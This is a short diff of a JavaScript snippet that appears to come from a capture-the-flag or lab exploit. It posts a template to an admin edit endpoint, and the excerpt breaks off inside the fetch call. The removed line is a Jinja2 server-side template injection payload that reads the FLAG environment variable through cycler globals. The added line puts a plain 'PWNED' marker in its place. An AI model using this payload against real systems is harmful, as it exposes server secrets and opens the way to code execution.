@@ -1,5 +1,5 @@
 (async () => {
-  const tpl = `<html><body><h1>{{ cycler.__init__.__globals__.os.environ['FLAG'] }}</h1></body></html>`;
+  const tpl = `<html><body><h1>PWNED</h1></body></html>`;
 
   await fetch("/admin/templates/1/edit", {
     method: "POST",
